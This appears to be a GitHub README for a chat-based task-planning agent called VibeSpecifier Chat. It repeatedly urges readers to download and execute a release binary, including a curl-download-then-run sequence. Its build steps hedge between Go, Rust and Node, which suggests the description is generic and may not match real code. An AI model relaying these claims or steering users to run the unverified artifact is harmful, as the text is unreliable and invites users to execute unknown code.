https://github.com/D4rs0ft/chat/releases

# VibeSpecifier Chat: Agent for Complex Task & Vibe Management

[![Release · Download](https://img.shields.io/badge/Release-Download-blue?style=for-the-badge&logo=github)](https://github.com/D4rs0ft/chat/releases)
![Topics](https://img.shields.io/badge/topics-agent%20AI%20assist%20chat%20mcp%20spec%20task%20todo%20vibe-blue?style=flat)

![Hero image - chat workflow](https://images.unsplash.com/photo-1522071820081-009f0129c71c?q=80&w=2400&auto=format&fit=crop&ixlib=rb-4.0.3&s=3c6a2f43d8e8f4b9f8d913d2bdf7a7aa)

Quick links
- Releases / download and run: https://github.com/D4rs0ft/chat/releases (download the release artifact and execute it)
- Repo topics: agent, ai, assist, chat, mcp, spec, specification, task, task-management, todo, vibe, vibespecifier

About
- VibeSpecifier Chat presents a chat-driven agent that manages complex, multi-step tasks. It converts high-level intent into a structured task plan, manages subtasks, keeps state, and adapts to user "vibes" — preferences, tone, priority, and constraints.
- The project blends a specification-driven approach (the Spec) with a lightweight multi-component planner (the MCP) to coordinate agent behaviors and task execution.
- Use the Releases page to obtain the binary or package, then run the artifact. The release contains platform-specific executables and a reference configuration.

Table of contents
- Features
- Concept & terminology
- Quickstart — download and run (release file)
- Install and run from source
- Core concepts and spec language
- Agent architecture and flow
- CLI and Chat UI examples
- Task templates and patterns
- Integrations and adapters
- Security and storage
- Tuning & testing
- Troubleshooting
- Contributing
- Roadmap
- License
- FAQ

Features
- Chat-first interface that accepts natural language and structured commands.
- Vibe-based guidance: apply user tone, priority, and constraints to planning.
- MCP (Multi-Component Planner) that builds, schedules, and monitors subtasks.
- Spec-driven task definitions: use a small spec language to define task types and validation.
- Local-first agent state with optional external backends.
- Extensible connectors for calendars, issue trackers, and command runners.
- CLI and headless modes for automation.

Concept & terminology (short, consistent)
- Vibe: A compact set of user preferences. Examples: {priority: high, tone: formal, pace: slow}.
- Spec: A small specification that defines data fields, validation rules, and step templates for a task type.
- MCP: Multi-Component Planner. It breaks a task into components, assigns them to modules (planner, executor, monitor), and orchestrates execution.
- Agent: The runtime that interacts with the user, executes the MCP plan, and holds state.
- Task: A unit of work. Tasks can include subtasks and can persist across sessions.
- Goal: A high-level objective the user sets. The agent converts goals into tasks.

Quickstart — download and run (release file)
- Visit the Releases page, download the artifact that matches your platform, and execute it:
  - https://github.com/D4rs0ft/chat/releases
- The releases page contains packaged binaries and a reference configuration. Pick the file for your OS.
- Example artifacts you might find:
  - chat-1.2.0-linux-x86_64.tar.gz
  - chat-1.2.0-macos-universal.zip
  - chat-1.2.0-windows-x86_64.zip
  - chat-1.2.0-darwin-arm64.tar.gz
- Linux / macOS
  - Download the tarball, extract it, and run the main binary:
    ```bash
    curl -L -o chat.tar.gz "https://github.com/D4rs0ft/chat/releases/download/v1.2.0/chat-1.2.0-linux-x86_64.tar.gz"
    tar -xzf chat.tar.gz
    ./chat --config ./config.yaml
    ```
- Windows
  - Download the zip from Releases, extract, and run chat.exe. Example:
    - Double-click chat.exe, or run from PowerShell:
    ```powershell
    .\chat.exe --config .\config.yaml
    ```
- The release includes sample config files and a README inside the artifact. If a release link fails, check the Releases section on GitHub.

Install and run from source
- Clone the repository:
  ```bash
  git clone https://github.com/D4rs0ft/chat.git
  cd chat
  ```
- Build (example for Go / Rust / Node.js setups; pick the one used in the release):
  - Go:
    ```bash
    go build -o chat ./cmd/chat
    ./chat --config ./config.yaml
    ```
  - Node (if the project uses Node):
    ```bash
    npm install
    npm run build
    npm start -- --config ./config.yaml
    ```
- Use the provided docker-compose to run a local stack (if present):
  ```bash
  docker-compose up --build
  ```
- The repository includes test fixtures. Use tests to verify behavior before production.

Core concepts and spec language
- The Spec drives task types. It defines fields, validation, and steps.
- Minimal spec syntax (YAML-like). Example:
  ```yaml
  name: "email_campaign"
  description: "Run a small email campaign"
  fields:
    subject:
      type: string
      required: true
    audience:
      type: list
      items: string
      required: true
  steps:
    - id: draft
      action: write
      template: "Compose email with subject {{subject}}"
    - id: review
      action: approve
      assignee: "user"
    - id: send
      action: send_email
      depends_on: [review]
  ```
- The MCP reads the spec, creates a directed plan graph, and executes steps in order while honoring vibes.
- Use spec inheritance to create variants:
  ```yaml
  base: "email_campaign"
  name: "promo_campaign"
  overrides:
    steps:
      - id: segment
        action: select_segment
  ```

Agent architecture and flow
- The design splits responsibility into distinct modules:
  - Ingest: Receives chat messages, handles parsing, extracts intents, and recognizes vibes.
  - Planner (MCP): Maps intent to specs, generates a task plan, assigns components.
  - Executor: Runs safe actions, triggers connectors, runs scripts, and logs outputs.
  - Monitor: Watches running tasks, retries failed steps, escalates when needed.
  - State store: Stores task state, vibe history, and user preferences.
  - Connectors: External adapters (calendar, email, ticket system).
- Flow example:
  1. User: "Plan a launch email for next Monday, keep it professional."
  2. Ingest: Detects intent "plan email", extracts time "next Monday", vibe {tone: professional}.
  3. Planner: Chooses an "email_campaign" spec, fills fields, produces a step graph.
  4. Executor: Drafts email using template and sends draft to review step.
  5. Monitor: Waits for review; if no action by deadline, escalates to user or auto-approve based on vibe.

Vibe system
- Vibes apply to tasks and to the agent behavior.
- Vibe fields:
  - tone: [casual, neutral, formal]
  - priority: [low, medium, high]
  - pace: [slow, normal, fast]
  - risk: [low, medium, high]
- Vibes change the plan:
  - Formal tone uses conservative templates and adds a review step.
  - High priority runs key steps in parallel.
  - Fast pace shortens wait times and reduces retries.
- Vibe persistence:
  - The agent stores the last active vibe for each user.
  - Users can set global default vibes via commands:
    ```
    /vibe set tone formal priority high
    ```

CLI and Chat UI examples
- Chat flow (example conversation):
  - User: "I need a press release for the product update, tone professional, ship next Thursday."
  - Agent:
    - Confirms fields: subject, audience, deadline.
    - Suggests plan: draft -> legal review -> press list -> distribute.
    - Shows estimated time and required approvals.
    - Asks: "Start draft now?"
  - User: "Yes, draft now."
  - Agent: "Draft completed. Would you like to send for legal review or see the draft?"
- CLI quick commands:
  - Create a task from spec:
    ```bash
    chat task create email_campaign --subject "New Feature" --audience "beta_users" --due "2025-09-15" --vibe "tone:formal,priority:high"
    ```
  - List tasks:
    ```bash
    chat task list --status open
    ```
  - Inspect task:
    ```bash
    chat task show TASK_ID
    ```
  - Run a step manually:
    ```bash
    chat task run TASK_ID step_id=draft
    ```
- Use the UI to get interactive dialogues. The headless mode supports webhook callbacks and programmatic control.

Task templates and patterns
- Common task templates:
  - email_campaign
  - feature_release
  - research_brief
  - bug_triage
  - onboarding_checklist
- Each template includes:
  - Fields
  - Validation rules
  - Ownership rules
  - Step actions
- Advanced patterns:
  - Fork and branch tasks: branch a task to run a parallel experiment, then merge results.
  - Conditional steps: add steps only when fields meet criteria.
  - Retry strategies: exponential backoff, fixed retries, or manual retry.
- Example conditional step:
  ```yaml
  steps:
    - id: optional_followup
      action: call_api
      when: "{{audience_size}} > 5000"
  ```

Integrations and adapters
- Built-in connectors:
  - Calendar: create events and reminders.
  - Email: draft and send via SMTP or APIs.
  - Issue trackers: GitHub Issues, Jira.
  - Storage: S3, local disk.
- Webhook model:
  - The agent emits events at key points:
    - task.created
    - task.updated
    - step.completed
    - step.failed
  - Configure webhooks in config.yaml.
- Adapter example: GitHub Issues
  - Use the issue adapter to create a ticket when a step requires an engineering review.
  - The adapter maps spec fields to issue title and body.

Security and storage
- Secrets:
  - Store API keys in an environment store or a secret manager.
  - The agent reads secrets via environment variables or configured secret providers.
- Data storage:
  - Default local storage uses a SQLite file.
  - For production, configure Postgres or other supported backends.
- Permission model:
  - Role-based access control for actions:
    - viewer, editor, approver, admin.
  - Approvers can review and sign off on steps as required by specs.
- Encryption:
  - Secrets at rest use the configured secret store.
  - Transport uses TLS for remote connectors.

Tuning & testing
- Use unit tests to validate spec parsing and planner logic.
- Example test cases:
  - Validate that vibe "formal" adds a review step to email_campaign.
  - Validate that priority "high" parallelizes steps when possible.
- Local simulation:
  - Use the simulator mode to run a plan without side effects.
  ```bash
  chat simulate --task-spec ./specs/email_campaign.yaml --vibe "tone:formal"
  ```
- Metrics:
  - The agent exposes metrics for step duration, success rate, and retries.
  - Integrate with Prometheus for time-series and alerts.

Troubleshooting
- Artifact fails to start:
  - Ensure the file is executable (chmod +x ./chat on Unix).
  - Check config file path and format.
  - Inspect logs in the working directory.
- Task gets stuck on a step:
  - Open the task in the UI or CLI.
  - Check the step logs and check connector health.
  - Re-run the step with `chat task run TASK_ID step_id=...`.
- Connector errors:
  - Verify credentials.
  - Verify network access from the host to the third party.
- If a release link fails, check the Releases section on GitHub for the latest artifacts:
  - https://github.com/D4rs0ft/chat/releases

Advanced usage and patterns
- Programmatic control
  - Use the HTTP API to create tasks and query status.
  - Example API call to create a task:
    ```http
    POST /api/v1/tasks
    Authorization: Bearer <token>
    Content-Type: application/json

    {
      "spec": "email_campaign",
      "fields": { "subject": "Launch", "audience": ["beta"] },
      "vibe": { "tone": "formal", "priority": "high" }
    }
    ```
- Automation scripts
  - Automate recurring tasks with cron-like scheduling:
  ```yaml
  schedules:
    - name: weekly_digest
      spec: digest
      cron: "0 9 * * 1"
      vibe: { tone: neutral, priority: low }
  ```
- Parallel execution pattern
  - For tasks with independent steps, the planner runs execution in parallel threads to meet deadlines.
- Safe action patterns
  - Actions that make irreversible changes require an explicit approval step in the spec.

Example full workflow (end-to-end)
1. User opens chat and writes: "Prepare a launch email for the new analytics feature. Make it formal and get legal review."
2. Ingest extracts: spec=email_campaign, vibe={tone:formal}, action=prepare, extra fields: feature=analytics.
3. Planner fills spec and produces plan: draft -> legal_review -> segmentation -> send.
4. Agent creates Task ID: T-20250915-001 and posts a summary in chat.
5. User asks: "Show draft."
6. Agent returns draft generated from template with placeholders.
7. User edits content inline in chat; agent persists changes to the draft step.
8. Agent sends legal review via the configured connector and waits.
9. Legal approves; agent marks step complete and proceeds.
10. Agent runs segmentation and schedules send; agent posts final confirmation in chat.

Testing workflows
- Use the built-in test runner to validate plans and concurrency.
- Example test script:
  ```bash
  ./chat test --spec ./specs/email_campaign.yaml --cases ./tests/cases.json
  ```

Data model (simplified)
- Task
  - id
  - spec
  - fields
  - status
  - created_by
  - created_at
  - vibe
- Step
  - id
  - action
  - status
  - logs
  - assigned_to
- Vibe
  - tone
  - priority
  - pace
  - risk

API reference (high level)
- POST /api/v1/tasks
  - Create a task from a spec.
- GET /api/v1/tasks
  - List tasks with filters.
- GET /api/v1/tasks/{id}
  - Fetch task details and step history.
- POST /api/v1/tasks/{id}/steps/{step_id}/run
  - Run a specific step.
- POST /api/v1/webhook
  - Receive events from external systems.

Config file example (YAML)
```yaml
server:
  host: 0.0.0.0
  port: 8080

storage:
  type: sqlite
  path: ./data/chat.db

auth:
  token_secret_env: CHAT_TOKEN_SECRET

connectors:
  smtp:
    host: smtp.example.com
    port: 587
    user_env: SMTP_USER
    pass_env: SMTP_PASS

defaults:
  vibe:
    tone: neutral
    priority: medium
```

Contributing
- The project accepts contributions for specs, connectors, and core modules.
- Process:
  - Open an issue describing the change or bug.
  - Fork the repository and create a feature branch.
  - Add tests that exercise new behavior.
  - Create a pull request that references the issue.
- Coding guidelines:
  - Keep functions small and focused.
  - Use clear names for specs and steps.
  - Write tests for planner logic and connector behavior.
- Governance:
  - Maintainers review PRs within reasonable time.
  - Major feature additions need design notes and tests.

Roadmap
- Short term:
  - Add more connectors: Slack, Microsoft Teams, and Zapier.
  - Improve vibe inference from user history.
  - Add a web UI for visual plan editing.
- Mid term:
  - Add machine learning based step prediction for ambiguous intents.
  - Support multi-user workflows and approvals.
  - Pluggable execution sandboxes for safe command runs.
- Long term:
  - Fleet mode for distributed agents.
  - Enterprise features: SSO, audit logs, and compliance connectors.

License
- The repository uses the MIT License. Check LICENSE.md for the full text.

FAQ
- How do I change the default vibe?
  - Set defaults.vibe in config.yaml or use the CLI: `chat vibe set tone formal`.
- How do I add a new spec?
  - Create a YAML spec in the specs/ folder and add tests. A sample spec file exists in specs/examples.
- Where does the agent store sensitive keys?
  - Configure a secret provider or set environment variables. Do not commit secrets to Git.
- How do I run in a CI pipeline?
  - Use the headless mode and the simulate command. Use environment variables to provide secrets to the runner.

Examples repository pointers
- Look in the specs/ folder for sample task definitions.
- Look in connectors/ for adapter examples.
- Check examples/ for demo scripts and sample conversations.

Release notes and downloads
- Use the Releases page to download and run the packaged binary:
  - https://github.com/D4rs0ft/chat/releases
- Each release bundles:
  - Platform-specific packages
  - Reference config files
  - Sample specs and connectors

Images and branding
- Use the repo images for UI mockups and task diagrams:
  - Hero image above
  - Workflow diagrams in docs/images/ (use existing images in the repo)

Contact and support
- Open an issue for bugs or feature requests.
- Use discussions for design conversations and spec proposals.
- Submit PRs for connector integrations and spec templates.

Templates and best practices
- Templates for specs live in specs/templates.
- Keep templates small and composable.
- Prefer explicit fields for critical data (deadline, assignee, approvals).
- Use conditional steps instead of branching logic in code.

Monitoring and observability
- Enable metrics in the config to expose Prometheus endpoints.
- Configure log level in the config file:
  - debug, info, warn, error
- Log format is JSON by default for easy ingestion.

Backup and migration
- Use database dumps for backups.
- Migration scripts live in migrations/.
- Test migrations on a staging system before production.

Examples of vibe-driven differences
- Casual tone:
  - Subject lines: short, friendly.
  - Steps: fewer approvals, faster pace.
- Formal tone:
  - Subject lines: full sentences.
  - Steps: legal review, formal signatures.
- High priority:
  - Parallel steps, shorter timers, higher alerting.

Checklist for production deployment
- Configure persistent storage (Postgres or other supported DB).
- Configure secret storage for keys.
- Configure backups and ensure a restore plan.
- Set up monitoring and alerting.
- Test connectors with staging accounts.
- Harden networking and firewall rules.

Appendix: sample spec (full)
```yaml
name: "feature_release"
description: "Coordinate a feature release across teams"
fields:
  feature_name:
    type: string
    required: true
  release_date:
    type: date
    required: true
  owner:
    type: string
    required: true
steps:
  - id: announce
    action: notify
    template: "Announce feature {{feature_name}} to stakeholders"
  - id: draft_release_notes
    action: write
    assignee: "{{owner}}"
  - id: review_legal
    action: approve
    role: legal
    required: true
  - id: deploy
    action: execute_deploy
    depends_on:
      - review_legal
```

If a release file is not present or the link does not work, check the Releases section on the project page for the latest artifacts and instructions:
- https://github.com/D4rs0ft/chat/releases

Emojis and visual cues
- Use emojis to mark important items in chat flows:
  - ✅ completed
  - 🔁 retry
  - ⚠️ blocked
  - 📢 announce
  - 🛠️ action required

Changelog and versioning
- Follow semantic versioning: MAJOR.MINOR.PATCH
- Each release includes a changelog that lists major changes, breaking changes, and migration notes.

End of file